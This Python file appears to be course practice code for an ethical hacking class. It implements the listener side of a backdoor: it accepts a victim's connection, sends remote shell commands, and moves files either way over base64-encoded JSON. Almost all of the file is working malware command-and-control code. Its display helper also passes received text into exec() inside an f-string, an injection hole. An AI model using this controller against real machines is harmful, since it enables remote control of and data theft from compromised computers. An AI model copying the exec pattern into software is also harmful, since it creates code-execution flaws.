#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
# ~^~ author:       pi4as3                      ~^~
# ~^~ description:  Listener                    ~^~
# ~^~ version:      0.1.0                       ~^~
"""
@@~~ZSecurity-PythonEthicalHackingFromScratch-Practical-Test~~@@ <-->
&& Version: 1.0 org. - Malware - -- minimal change cause python3.9 &&
"""
import base64
import json
import os
import socket
import sys
from typing import Union, Any

# - Für das nächste Update
BUFFERSIZE = 1024
PROMPT = '[@]$~Shell~$> '
OUTSTYLE_PLUS = '[+] '
OUTSTYLE_MINUS = '[-] '
OUTSTYLE_STAR = '[*] '


def display(text: Union[str, bytes, Any], style=None, prompt: str = PROMPT, flush=False, end='\\n'):
    """
    Helper func to Display text output in the console
    :param str text:    Output text for the Display
    :param str prompt:  Normal the const PROMPT, but also possibility to do a change
    :param str style:   One of the Output const from OUTSTYLE--GOOD-BAD-WONDER, otherwise will display the Prompt
    :param flush:       flush Parameter from Pythons print function, if you need it somewhere other as the default
    :param str end:     end Parameter from Pythons print function, if you need it somewhere other as the default
    """
    if isinstance(text, bytes):
        text = text.decode('utf-8')
    else:
        text = str(text)
    if style:
        exec(f"""print('{style}{text}',flush='{flush}', end='{end}')""")
    else:
        exec(f"""print('{prompt}{text}',flush='{flush}', end='{end}')""")

class Listener(object):
    def __init__(self, ip: str = '127.0.0.1', port: int = 26262):
        try:
            super(Listener, self).__init__()
            self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener.bind((ip, port))
            self.listener.listen(0)
            display('Waiting for connections', style=OUTSTYLE_PLUS)
            self.connection, addr = self.listener.accept()
            display('Connection from {addr[0]} established', style=OUTSTYLE_PLUS)
        except Exception as err:
            display('Error while trying to get a connection from client: {0}'.format(err.__str__()), style=OUTSTYLE_MINUS)

    # ## ### --- -- - Network handling area - --- ### ## #
    def reliable_send(self, data: Any) -> None:
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self) -> Any:
        raw_data = b''
        while True:
            packet = self.connection.recv(BUFFERSIZE)
            raw_data += packet
            if len(packet) < BUFFERSIZE:
                break
        return json.loads(raw_data.decode())

    # ## ### --- -- - handling reading and writing files - --- ### ## #
    def read_file(self, filename: Union[str, bytes, os.PathLike.__class__(), os.PathLike]) -> bytes:
        try:
            with open(filename, 'rb') as file:
                return base64.b64encode(file.read())
        except OSError:
            return b'OSError'

    def write_file(self, filename, content: Union[bytes, str]) -> str:
        try:
            with open(filename, 'wb') as file:
                file.write(base64.b64decode(content))
            return f'{OUTSTYLE_PLUS} The File {filename} successfully written into {os.getcwd()}.'
        except OSError:
            return 'OSError'

    # ## ### --- -- - generally handling commands to remote and back - --- ### ## #
    def execute_remotely(self, command: list) -> Any:
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            sys.exit()

        return self.reliable_receive()

    # ## ### --- -- - main loop into wrapper in order to exceptions dont crash application - --- ### ## #
    def __exception_wrapper(self):
        # - take a list off strings as cmd-message, so that is easy to select needed variable
        command: list[str] = input(PROMPT).split(' ')
        # - ask

        # If upload from local to remote
        if command[0] == 'upload' and len(command) > 1:
            if os.path.exists(command[1]):
                # - if local file without whitespaces is exist then read and send
                file_content = self.read_file(command[1])
                # - add file to command list
                command.append(file_content)
            else:
                # bau: eine funktion die leerzeichen zählt dann kann alles nach upload zusammengesetzt werden aber immer mit leerzeichen obs geht ka sonst google
                # - if local file with removed whitespaces exist then read and send
                # - erst zaids plan zuende machen
                filepath = ''.join(command[1:])
                if os.path.exists(filepath):
                    file_content = self.read_file(filepath)
                    # - add file to command list
                    command.append(file_content)
                else:
                    # - local file cant be located, print and do nothing
                    display('Cant locate local file, please check your Input', style=OUTSTYLE_MINUS)

        # - send command list to remote executing
        result = self.execute_remotely(command)

        # - remote to local file download, take the filename from cmd input and content from remote-execute result
        if command[0] == 'download' and len(command) > 1:
            # bau: wenn leerzeichen im dateinamen sind dann  [download, space, [4,6,8,9]]
            # build: take a command after download for backdoor and a list of ints, wo die LEERZEICHEN sind

            # - write the result in datahome and for safety remove whitespaces in filename
            result = self.write_file(command[1].strip(' '), result)

        # - output the generally result from client or errormessage from any kind of
        display(text='{0}'.format(result))

    def run(self):
        while True:
            try:
                # - Main Prompt Execution comes into a Wrapper cause off order
                self.__exception_wrapper()
            except KeyboardInterrupt:
                if input('Quit Program Y/N').upper().startswith('Y'):
                    break
                else:
                    continue
            except Exception:
                display('Error in Main-Command Prompt loop', style=OUTSTYLE_MINUS)


ccc_handler = Listener()
ccc_handler.run()
